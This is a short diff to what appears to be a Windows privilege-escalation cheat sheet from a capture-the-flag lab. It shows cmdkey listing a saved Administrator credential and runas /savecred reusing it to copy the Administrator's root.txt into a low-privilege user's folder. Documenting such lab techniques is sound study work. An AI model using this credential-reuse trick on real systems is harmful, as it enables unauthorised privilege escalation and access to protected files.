@@ -269,9 +269,9 @@ Cached Credentials:
 ```powershell
 # CMDKEY: https://ss64.com/nt/cmdkey.html
 $ cmdkey /list      
-    # Target: Domain:interactive=ACCESS\Administrator
-    # Type: Domain Password
-    # User: ACCESS\Administrator
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
 
 # RUNAS: https://ss64.com/nt/runas.html
 $ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administrator\Desktop\root.txt>C:\Users\noob\out.txt"
